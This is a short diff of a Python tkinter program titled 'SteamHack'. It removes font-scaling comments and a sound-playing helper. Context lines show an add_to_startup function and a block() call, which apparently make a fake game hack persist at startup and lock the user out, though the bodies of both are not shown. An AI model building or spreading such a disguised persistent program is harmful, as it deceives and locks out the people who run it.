@@ -18,25 +18,16 @@ window.title("SteamHack")
 window.geometry('400x250')
 window['bg'] = 'blue'
 
-# Base size
 normal_width = 1920
 normal_height = 1080
 
-# Get screen size
 screen_width = window.winfo_screenwidth()
 screen_height = window.winfo_screenheight()
 
-# Get percentage of screen size from Base size
 percentage_width = screen_width / (normal_width / 100)
 percentage_height = screen_height / (normal_height / 100)
 
-# Make a scaling factor, this is bases on average percentage from
-# width and height.
 scale_factor = ((percentage_width + percentage_height) / 2) / 100
-
-# Set the fontsize based on scale_factor,
-# if the fontsize is less than minimum_size
-# it is set to the minimum size
 
 fontsize = int(20 * scale_factor)
 minimum_size = 10
@@ -48,12 +39,8 @@ minimum_size = 40
 if fontsizeHding < minimum_size:
        fontsizeHding = minimum_size
 
-# Create a style and configure for ttk.Button widget
 default_style = ttk.Style()
 default_style.configure('New.TButton', font=("Helvetica", fontsize))
-
-def play(test):
-        playsound('sound.mp3', False)
 
 def add_to_startup(file_path=""):
     if file_path == "":
@@ -101,6 +88,5 @@ btn.place(relx = .62, rely = .5, relwidth=.1, relheight=.06)
 
 block()
 
-play('sound.mp3')
 
 window.mainloop()
